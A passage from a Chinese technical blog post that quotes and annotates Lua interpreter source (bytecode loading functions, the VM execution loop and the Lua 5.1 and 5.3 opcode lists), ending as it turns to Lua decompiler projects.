class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadFunction</span> <span class="params">(LoadState *S, Proto *f, TString *psource)</span> &#123;</span><br><span class="line">  f-&gt;source = LoadString(S, f);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;source == <span class="literal">NULL</span>)  <span class="comment">/* no source in dump? */</span></span><br><span class="line">    f-&gt;source = psource;  <span class="comment">/* reuse parent&#x27;s source */</span></span><br><span class="line">  f-&gt;linedefined = LoadInt(S);</span><br><span class="line">  f-&gt;lastlinedefined = LoadInt(S);</span><br><span class="line">  f-&gt;numparams = LoadByte(S);</span><br><span class="line">  f-&gt;is_vararg = LoadByte(S);</span><br><span class="line">  f-&gt;maxstacksize = LoadByte(S);</span><br><span class="line">  LoadCode(S, f);</span><br><span class="line">  LoadConstants(S, f);</span><br><span class="line">  LoadUpvalues(S, f);</span><br><span class="line">  LoadProtos(S, f);</span><br><span class="line">  LoadDebug(S, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是加载一些proto信息</p><h6 id="LoadCode-1"><a href="#LoadCode-1" class="headerlink" title="LoadCode"></a>LoadCode</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadCode</span> <span class="params">(LoadState *S, Proto *f)</span> &#123;</span><br><span class="line">  <span class="type">int</span> n = LoadInt(S);</span><br><span class="line">  f-&gt;code = luaM_newvector(S-&gt;L, n, Instruction);</span><br><span class="line">  f-&gt;sizecode = n;</span><br><span class="line">  LoadVector(S, f-&gt;code, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并无变化</p><h6 id="LoadConstants-1"><a href="#LoadConstants-1" class="headerlink" title="LoadConstants"></a>LoadConstants</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadConstants</span> <span class="params">(LoadState *S, Proto *f)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> n = LoadInt(S);</span><br><span class="line">  f-&gt;k = luaM_newvector(S-&gt;L, n, TValue);</span><br><span class="line">  f-&gt;sizek = n;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    setnilvalue(&amp;f-&gt;k[i]);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    TValue *o = &amp;f-&gt;k[i];</span><br><span class="line">    <span class="type">int</span> t = LoadByte(S);</span><br><span class="line">    <span class="keyword">switch</span> (t) &#123;</span><br><span class="line">    <span class="keyword">case</span> LUA_TNIL:</span><br><span class="line">      setnilvalue(o);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> LUA_TBOOLEAN:</span><br><span class="line">      setbvalue(o, LoadByte(S));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> LUA_TNUMFLT:</span><br><span class="line">      setfltvalue(o, LoadNumber(S));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> LUA_TNUMINT:</span><br><span class="line">      setivalue(o, LoadInteger(S));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> LUA_TSHRSTR:</span><br><span class="line">    <span class="keyword">case</span> LUA_TLNGSTR:</span><br><span class="line">      setsvalue2n(S-&gt;L, o, LoadString(S, f));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      lua_assert(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递归处理不在出现在该函数</p><p>数字变量将整数于浮点数区分开,短字符串于长字符串分离</p><ul><li><strong>LUA_TNUMFLT</strong>:浮点数</li><li><strong>LUA_TNUMINT</strong>:整数</li><li><strong>LUA_TSHRSTR</strong>:短字符串</li><li><strong>LUA_TLNGSTR</strong>:长字符串</li></ul><p>但实际上应该只是针对某种特殊处理,因为基本类型还是这9种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TNIL0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TBOOLEAN1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TLIGHTUSERDATA2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TNUMBER3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TSTRING4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TTABLE5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TFUNCTION6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TUSERDATA7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_TTHREAD8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LUA_NUMTAGS9</span></span><br></pre></td></tr></table></figure><h6 id="LoadUpvalues"><a href="#LoadUpvalues" class="headerlink" title="LoadUpvalues"></a>LoadUpvalues</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadUpvalues</span> <span class="params">(LoadState *S, Proto *f)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, n;</span><br><span class="line">  n = LoadInt(S);</span><br><span class="line">  f-&gt;upvalues = luaM_newvector(S-&gt;L, n, Upvaldesc);</span><br><span class="line">  f-&gt;sizeupvalues = n;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    f-&gt;upvalues[i].name = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    f-&gt;upvalues[i].instack = LoadByte(S);</span><br><span class="line">    f-&gt;upvalues[i].idx = LoadByte(S);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提前处理upvalue</p><h6 id="LoadProtos"><a href="#LoadProtos" class="headerlink" title="LoadProtos"></a>LoadProtos</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadProtos</span> <span class="params">(LoadState *S, Proto *f)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> n = LoadInt(S);</span><br><span class="line">  f-&gt;p = luaM_newvector(S-&gt;L, n, Proto *);</span><br><span class="line">  f-&gt;sizep = n;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    f-&gt;p[i] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    f-&gt;p[i] = luaF_newproto(S-&gt;L);</span><br><span class="line">    luaC_objbarrier(S-&gt;L, f, f-&gt;p[i]);</span><br><span class="line">    LoadFunction(S, f-&gt;p[i], f-&gt;source);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将递归处理proto单独使用一个函数</p><h6 id="LoadDebug-1"><a href="#LoadDebug-1" class="headerlink" title="LoadDebug"></a>LoadDebug</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadDebug</span> <span class="params">(LoadState *S, Proto *f)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, n;</span><br><span class="line">  n = LoadInt(S);</span><br><span class="line">  f-&gt;lineinfo = luaM_newvector(S-&gt;L, n, <span class="type">int</span>);</span><br><span class="line">  f-&gt;sizelineinfo = n;</span><br><span class="line">  LoadVector(S, f-&gt;lineinfo, n);</span><br><span class="line">  n = LoadInt(S);</span><br><span class="line">  f-&gt;locvars = luaM_newvector(S-&gt;L, n, LocVar);</span><br><span class="line">  f-&gt;sizelocvars = n;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    f-&gt;locvars[i].varname = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    f-&gt;locvars[i].varname = LoadString(S, f);</span><br><span class="line">    f-&gt;locvars[i].startpc = LoadInt(S);</span><br><span class="line">    f-&gt;locvars[i].endpc = LoadInt(S);</span><br><span class="line">  &#125;</span><br><span class="line">  n = LoadInt(S);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    f-&gt;upvalues[i].name = LoadString(S, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理debug信息</p><h4 id="docall"><a href="#docall" class="headerlink" title="docall"></a>docall</h4><p>在分析完加载的过程后,我们再次回到<code>handle_script</code>向下执行,来到<code>docall</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">docall</span> <span class="params">(lua_State *L, <span class="type">int</span> narg, <span class="type">int</span> nres)</span> &#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">int</span> base = lua_gettop(L) - narg;  <span class="comment">/* function index */</span></span><br><span class="line">  lua_pushcfunction(L, msghandler);  <span class="comment">/* push message handler */</span></span><br><span class="line">  lua_insert(L, base);  <span class="comment">/* put it under function and args */</span></span><br><span class="line">  globalL = L;  <span class="comment">/* to be available to &#x27;laction&#x27; */</span></span><br><span class="line">  signal(SIGINT, laction);  <span class="comment">/* set C-signal handler */</span></span><br><span class="line">  status = lua_pcall(L, narg, nres, base);</span><br><span class="line">  signal(SIGINT, SIG_DFL); <span class="comment">/* reset C-signal handler */</span></span><br><span class="line">  lua_remove(L, base);  <span class="comment">/* remove message handler from the stack */</span></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着如下调用<code>lua_pcall(lua_pcallk)</code>-&gt;<code>luaD_pcall</code>-&gt;<code>f_call</code>-&gt;<code>luaD_callnoyield</code>-&gt;<code>luaD_call</code>-&gt;<code>luaV_execute</code></p><h4 id="luaV-execute"><a href="#luaV-execute" class="headerlink" title="luaV_execute"></a>luaV_execute</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">luaV_execute</span> <span class="params">(lua_State *L)</span> &#123;</span><br><span class="line">  CallInfo *ci = L-&gt;ci;</span><br><span class="line">  LClosure *cl;</span><br><span class="line">  TValue *k;</span><br><span class="line">  StkId base;</span><br><span class="line">  ci-&gt;callstatus |= CIST_FRESH;  <span class="comment">/* fresh invocation of &#x27;luaV_execute&quot; */</span></span><br><span class="line"> newframe:  <span class="comment">/* reentry point when frame changes (call/return) */</span></span><br><span class="line">  lua_assert(ci == L-&gt;ci);</span><br><span class="line">  cl = clLvalue(ci-&gt;func);  <span class="comment">/* local reference to function&#x27;s closure */</span></span><br><span class="line">  k = cl-&gt;p-&gt;k;  <span class="comment">/* local reference to function&#x27;s constant table */</span></span><br><span class="line">  base = ci-&gt;u.l.base;  <span class="comment">/* local copy of function&#x27;s base */</span></span><br><span class="line">  <span class="comment">/* main loop of interpreter */</span></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    Instruction i;</span><br><span class="line">    StkId ra;</span><br><span class="line">    vmfetch();</span><br><span class="line">    vmdispatch (GET_OPCODE(i)) &#123;</span><br><span class="line">      vmcase(OP_MOVE) &#123;</span><br><span class="line">        setobjs2s(L, ra, RB(i));</span><br><span class="line">        vmbreak;</span><br><span class="line">      &#125;</span><br><span class="line">      vmcase(OP_LOADK) &#123;</span><br><span class="line">        TValue *rb = k + GETARG_Bx(i);</span><br><span class="line">        setobj2s(L, ra, rb);</span><br><span class="line">        vmbreak;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>读取OPCODE并进行对应操作,<code>5.1</code>于<code>5.3</code>OPCODE有差异</p><h5 id="5-1-1"><a href="#5-1-1" class="headerlink" title="5.1"></a>5.1</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">nameargsdescription</span></span><br><span class="line"><span class="comment">------------------------------------------------------------------------*/</span></span><br><span class="line">OP_MOVE,<span class="comment">/*A BR(A) := R(B)*/</span></span><br><span class="line">OP_LOADK,<span class="comment">/*A BxR(A) := Kst(Bx)*/</span></span><br><span class="line">OP_LOADBOOL,<span class="comment">/*A B CR(A) := (Bool)B; if (C) pc++*/</span></span><br><span class="line">OP_LOADNIL,<span class="comment">/*A BR(A) := ... := R(B) := nil*/</span></span><br><span class="line">OP_GETUPVAL,<span class="comment">/*A BR(A) := UpValue[B]*/</span></span><br><span class="line"></span><br><span class="line">OP_GETGLOBAL,<span class="comment">/*A BxR(A) := Gbl[Kst(Bx)]*/</span></span><br><span class="line">OP_GETTABLE,<span class="comment">/*A B CR(A) := R(B)[RK(C)]*/</span></span><br><span class="line"></span><br><span class="line">OP_SETGLOBAL,<span class="comment">/*A BxGbl[Kst(Bx)] := R(A)*/</span></span><br><span class="line">OP_SETUPVAL,<span class="comment">/*A BUpValue[B] := R(A)*/</span></span><br><span class="line">OP_SETTABLE,<span class="comment">/*A B CR(A)[RK(B)] := RK(C)*/</span></span><br><span class="line"></span><br><span class="line">OP_NEWTABLE,<span class="comment">/*A B CR(A) := &#123;&#125; (size = B,C)*/</span></span><br><span class="line"></span><br><span class="line">OP_SELF,<span class="comment">/*A B CR(A+1) := R(B); R(A) := R(B)[RK(C)]*/</span></span><br><span class="line"></span><br><span class="line">OP_ADD,<span class="comment">/*A B CR(A) := RK(B) + RK(C)*/</span></span><br><span class="line">OP_SUB,<span class="comment">/*A B CR(A) := RK(B) - RK(C)*/</span></span><br><span class="line">OP_MUL,<span class="comment">/*A B CR(A) := RK(B) * RK(C)*/</span></span><br><span class="line">OP_DIV,<span class="comment">/*A B CR(A) := RK(B) / RK(C)*/</span></span><br><span class="line">OP_MOD,<span class="comment">/*A B CR(A) := RK(B) % RK(C)*/</span></span><br><span class="line">OP_POW,<span class="comment">/*A B CR(A) := RK(B) ^ RK(C)*/</span></span><br><span class="line">OP_UNM,<span class="comment">/*A BR(A) := -R(B)*/</span></span><br><span class="line">OP_NOT,<span class="comment">/*A BR(A) := not R(B)*/</span></span><br><span class="line">OP_LEN,<span class="comment">/*A BR(A) := length of R(B)*/</span></span><br><span class="line"></span><br><span class="line">OP_CONCAT,<span class="comment">/*A B CR(A) := R(B).. ... ..R(C)*/</span></span><br><span class="line"></span><br><span class="line">OP_JMP,<span class="comment">/*sBxpc+=sBx*/</span></span><br><span class="line"></span><br><span class="line">OP_EQ,<span class="comment">/*A B Cif ((RK(B) == RK(C)) ~= A) then pc++*/</span></span><br><span class="line">OP_LT,<span class="comment">/*A B Cif ((RK(B) &lt;  RK(C)) ~= A) then pc++  */</span></span><br><span class="line">OP_LE,<span class="comment">/*A B Cif ((RK(B) &lt;= RK(C)) ~= A) then pc++  */</span></span><br><span class="line"></span><br><span class="line">OP_TEST,<span class="comment">/*A Cif not (R(A) &lt;=&gt; C) then pc++*/</span> </span><br><span class="line">OP_TESTSET,<span class="comment">/*A B Cif (R(B) &lt;=&gt; C) then R(A) := R(B) else pc++*/</span> </span><br><span class="line"></span><br><span class="line">OP_CALL,<span class="comment">/*A B CR(A), ... ,R(A+C-2) := R(A)(R(A+1), ... ,R(A+B-1)) */</span></span><br><span class="line">OP_TAILCALL,<span class="comment">/*A B Creturn R(A)(R(A+1), ... ,R(A+B-1))*/</span></span><br><span class="line">OP_RETURN,<span class="comment">/*A Breturn R(A), ... ,R(A+B-2)(see note)*/</span></span><br><span class="line"></span><br><span class="line">OP_FORLOOP,<span class="comment">/*A sBxR(A)+=R(A+2);</span></span><br><span class="line"><span class="comment">if R(A) &lt;?= R(A+1) then &#123; pc+=sBx; R(A+3)=R(A) &#125;*/</span></span><br><span class="line">OP_FORPREP,<span class="comment">/*A sBxR(A)-=R(A+2); pc+=sBx*/</span></span><br><span class="line"></span><br><span class="line">OP_TFORLOOP,<span class="comment">/*A CR(A+3), ... ,R(A+2+C) := R(A)(R(A+1), R(A+2)); </span></span><br><span class="line"><span class="comment">                        if R(A+3) ~= nil then R(A+2)=R(A+3) else pc++*/</span> </span><br><span class="line">OP_SETLIST,<span class="comment">/*A B CR(A)[(C-1)*FPF+i] := R(A+i), 1 &lt;= i &lt;= B*/</span></span><br><span class="line"></span><br><span class="line">OP_CLOSE,<span class="comment">/*A close all variables in the stack up to (&gt;=) R(A)*/</span></span><br><span class="line">OP_CLOSURE,<span class="comment">/*A BxR(A) := closure(KPROTO[Bx], R(A), ... ,R(A+n))*/</span></span><br><span class="line"></span><br><span class="line">OP_VARARG<span class="comment">/*A BR(A), R(A+1), ..., R(A+B-1) = vararg*/</span></span><br><span class="line">&#125; OpCode;</span><br></pre></td></tr></table></figure><h5 id="5-3-1"><a href="#5-3-1" class="headerlink" title="5.3"></a>5.3</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">nameargsdescription</span></span><br><span class="line"><span class="comment">------------------------------------------------------------------------*/</span></span><br><span class="line">OP_MOVE,<span class="comment">/*A BR(A) := R(B)*/</span></span><br><span class="line">OP_LOADK,<span class="comment">/*A BxR(A) := Kst(Bx)*/</span></span><br><span class="line">OP_LOADKX,<span class="comment">/*A R(A) := Kst(extra arg)*/</span></span><br><span class="line">OP_LOADBOOL,<span class="comment">/*A B CR(A) := (Bool)B; if (C) pc++*/</span></span><br><span class="line">OP_LOADNIL,<span class="comment">/*A BR(A), R(A+1), ..., R(A+B) := nil*/</span></span><br><span class="line">OP_GETUPVAL,<span class="comment">/*A BR(A) := UpValue[B]*/</span></span><br><span class="line"></span><br><span class="line">OP_GETTABUP,<span class="comment">/*A B CR(A) := UpValue[B][RK(C)]*/</span></span><br><span class="line">OP_GETTABLE,<span class="comment">/*A B CR(A) := R(B)[RK(C)]*/</span></span><br><span class="line"></span><br><span class="line">OP_SETTABUP,<span class="comment">/*A B CUpValue[A][RK(B)] := RK(C)*/</span></span><br><span class="line">OP_SETUPVAL,<span class="comment">/*A BUpValue[B] := R(A)*/</span></span><br><span class="line">OP_SETTABLE,<span class="comment">/*A B CR(A)[RK(B)] := RK(C)*/</span></span><br><span class="line"></span><br><span class="line">OP_NEWTABLE,<span class="comment">/*A B CR(A) := &#123;&#125; (size = B,C)*/</span></span><br><span class="line"></span><br><span class="line">OP_SELF,<span class="comment">/*A B CR(A+1) := R(B); R(A) := R(B)[RK(C)]*/</span></span><br><span class="line"></span><br><span class="line">OP_ADD,<span class="comment">/*A B CR(A) := RK(B) + RK(C)*/</span></span><br><span class="line">OP_SUB,<span class="comment">/*A B CR(A) := RK(B) - RK(C)*/</span></span><br><span class="line">OP_MUL,<span class="comment">/*A B CR(A) := RK(B) * RK(C)*/</span></span><br><span class="line">OP_MOD,<span class="comment">/*A B CR(A) := RK(B) % RK(C)*/</span></span><br><span class="line">OP_POW,<span class="comment">/*A B CR(A) := RK(B) ^ RK(C)*/</span></span><br><span class="line">OP_DIV,<span class="comment">/*A B CR(A) := RK(B) / RK(C)*/</span></span><br><span class="line">OP_IDIV,<span class="comment">/*A B CR(A) := RK(B) // RK(C)*/</span></span><br><span class="line">OP_BAND,<span class="comment">/*A B CR(A) := RK(B) &amp; RK(C)*/</span></span><br><span class="line">OP_BOR,<span class="comment">/*A B CR(A) := RK(B) | RK(C)*/</span></span><br><span class="line">OP_BXOR,<span class="comment">/*A B CR(A) := RK(B) ~ RK(C)*/</span></span><br><span class="line">OP_SHL,<span class="comment">/*A B CR(A) := RK(B) &lt;&lt; RK(C)*/</span></span><br><span class="line">OP_SHR,<span class="comment">/*A B CR(A) := RK(B) &gt;&gt; RK(C)*/</span></span><br><span class="line">OP_UNM,<span class="comment">/*A BR(A) := -R(B)*/</span></span><br><span class="line">OP_BNOT,<span class="comment">/*A BR(A) := ~R(B)*/</span></span><br><span class="line">OP_NOT,<span class="comment">/*A BR(A) := not R(B)*/</span></span><br><span class="line">OP_LEN,<span class="comment">/*A BR(A) := length of R(B)*/</span></span><br><span class="line"></span><br><span class="line">OP_CONCAT,<span class="comment">/*A B CR(A) := R(B).. ... ..R(C)*/</span></span><br><span class="line"></span><br><span class="line">OP_JMP,<span class="comment">/*A sBxpc+=sBx; if (A) close all upvalues &gt;= R(A - 1)*/</span></span><br><span class="line">OP_EQ,<span class="comment">/*A B Cif ((RK(B) == RK(C)) ~= A) then pc++*/</span></span><br><span class="line">OP_LT,<span class="comment">/*A B Cif ((RK(B) &lt;  RK(C)) ~= A) then pc++*/</span></span><br><span class="line">OP_LE,<span class="comment">/*A B Cif ((RK(B) &lt;= RK(C)) ~= A) then pc++*/</span></span><br><span class="line"></span><br><span class="line">OP_TEST,<span class="comment">/*A Cif not (R(A) &lt;=&gt; C) then pc++*/</span></span><br><span class="line">OP_TESTSET,<span class="comment">/*A B Cif (R(B) &lt;=&gt; C) then R(A) := R(B) else pc++*/</span></span><br><span class="line"></span><br><span class="line">OP_CALL,<span class="comment">/*A B CR(A), ... ,R(A+C-2) := R(A)(R(A+1), ... ,R(A+B-1)) */</span></span><br><span class="line">OP_TAILCALL,<span class="comment">/*A B Creturn R(A)(R(A+1), ... ,R(A+B-1))*/</span></span><br><span class="line">OP_RETURN,<span class="comment">/*A Breturn R(A), ... ,R(A+B-2)(see note)*/</span></span><br><span class="line"></span><br><span class="line">OP_FORLOOP,<span class="comment">/*A sBxR(A)+=R(A+2);</span></span><br><span class="line"><span class="comment">if R(A) &lt;?= R(A+1) then &#123; pc+=sBx; R(A+3)=R(A) &#125;*/</span></span><br><span class="line">OP_FORPREP,<span class="comment">/*A sBxR(A)-=R(A+2); pc+=sBx*/</span></span><br><span class="line"></span><br><span class="line">OP_TFORCALL,<span class="comment">/*A CR(A+3), ... ,R(A+2+C) := R(A)(R(A+1), R(A+2));*/</span></span><br><span class="line">OP_TFORLOOP,<span class="comment">/*A sBxif R(A+1) ~= nil then &#123; R(A)=R(A+1); pc += sBx &#125;*/</span></span><br><span class="line"></span><br><span class="line">OP_SETLIST,<span class="comment">/*A B CR(A)[(C-1)*FPF+i] := R(A+i), 1 &lt;= i &lt;= B*/</span></span><br><span class="line"></span><br><span class="line">OP_CLOSURE,<span class="comment">/*A BxR(A) := closure(KPROTO[Bx])*/</span></span><br><span class="line"></span><br><span class="line">OP_VARARG,<span class="comment">/*A BR(A), R(A+1), ..., R(A+B-2) = vararg*/</span></span><br><span class="line"></span><br><span class="line">OP_EXTRAARG<span class="comment">/*Axextra (larger) argument for previous opcode*/</span></span><br><span class="line">&#125; OpCode;</span><br></pre></td></tr></table></figure><h1 id="mi-lua"><a href="#mi-lua" class="headerlink" title="mi_lua"></a>mi_lua</h1><p>在github中找到了不少unluac的项目,但大多数都是java编写而成,不过学长提到的<a 